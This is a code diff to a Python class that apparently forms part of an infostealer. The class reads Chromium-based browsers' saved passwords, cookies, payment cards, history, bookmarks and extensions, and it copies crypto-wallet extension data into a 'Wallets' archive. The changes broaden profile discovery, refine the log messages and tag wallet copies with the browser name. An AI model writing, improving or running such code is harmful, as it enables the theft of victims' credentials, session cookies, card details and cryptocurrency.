@@ -51,11 +51,14 @@ class Chromium:
         Returns:
         - list: List of all browser profiles.
         """
-        if self.__browser_name == Browsers.OPERA_GX.value:
-            return [self.__browser_path]
-
         pattern = compile(r"Default|Profile \d+")
-        return [path.join(self.__browser_path, profile) for profile in sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])]
+        profiles = sum([pattern.findall(dir_path) for dir_path in listdir(self.__browser_path)], [])
+        profile_paths = [path.join(self.__browser_path, profile) for profile in profiles]
+
+        if profile_paths:
+            return profile_paths
+
+        return [self.__browser_path]
 
     def _check_paths(self) -> None:
         """
@@ -192,7 +195,7 @@ class Chromium:
         - None.
         """
         if not path.exists(file_path):
-            print(f"[{self.__browser_name}]: No passwords found")
+            print(f"[{self.__browser_name}]: No passwords file found")
             return
 
         cursor, connection = self._get_db_connection(file_path)
@@ -202,6 +205,7 @@ class Chromium:
         connection.close()
 
         if not passwords_list:
+            print(f"[{self.__browser_name}]: No passwords found")
             return
 
         data = self.__config.PasswordsData
@@ -228,7 +232,7 @@ class Chromium:
         - None.
         """
         if not path.exists(file_path):
-            print(f"[{self.__browser_name}]: No cookies found")
+            print(f"[{self.__browser_name}]: No cookies file found")
             return
 
         cursor, connection = self._get_db_connection(file_path)
@@ -238,6 +242,7 @@ class Chromium:
         connection.close()
 
         if not cookies_list:
+            print(f"[{self.__browser_name}]: No cookies found")
             return
 
         cookies_list_filtered = [row for row in cookies_list if row[0] != ""]
@@ -266,7 +271,7 @@ class Chromium:
         - None.
         """
         if not path.exists(file_path):
-            print(f"[{self.__browser_name}]: No cards found")
+            print(f"[{self.__browser_name}]: No cards file found")
             return
 
         cursor, connection = self._get_db_connection(file_path)
@@ -276,6 +281,7 @@ class Chromium:
         connection.close()
 
         if not cards_list:
+            print(f"[{self.__browser_name}]: No cards found")
             return
 
         data = self.__config.CardsData
@@ -302,7 +308,7 @@ class Chromium:
         - None.
         """
         if not path.exists(file_path):
-            print(f"[{self.__browser_name}]: No history found")
+            print(f"[{self.__browser_name}]: No history file found")
             return
 
         cursor, connection = self._get_db_connection(file_path)
@@ -313,6 +319,7 @@ class Chromium:
         connection.close()
 
         if not results:
+            print(f"[{self.__browser_name}]: No history found")
             return
 
         data = self.__config.HistoryData
@@ -339,13 +346,14 @@ class Chromium:
         - None.
         """
         if not path.exists(file_path):
-            print(f"[{self.__browser_name}]: No bookmarks found")
+            print(f"[{self.__browser_name}]: No bookmarks file found")
             return
 
         file = self._get_file(file_path)
         bookmarks_list = sum([self.__config.BookmarksRegex.findall(item) for item in file.split("{")], [])
 
         if not bookmarks_list:
+            print(f"[{self.__browser_name}]: No bookmarks found")
             return
 
         data = self.__config.BookmarksData
@@ -371,13 +379,14 @@ class Chromium:
         - None.
         """
         if not path.exists(extensions_path):
-            print(f"[{self.__browser_name}]: No extensions found")
+            print(f"[{self.__browser_name}]: No extensions folder found")
             return
 
         extensions_list = []
         extensions_dirs = listdir(extensions_path)
 
-        if len(extensions_dirs) == 0:
+        if not extensions_dirs:
+            print(f"[{self.__browser_name}]: No extensions found")
             return
 
         for dirpath in extensions_dirs:
@@ -431,7 +440,7 @@ class Chromium:
 
                     self.__storage.add_from_disk(
                         extension_path,
-                        path.join("Wallets", rf'{profile} {wallet["name"]}')
+                        path.join("Wallets", rf'{self.__browser_name} {profile} {wallet["name"]}')
                     )
 
                 except Exception as e:
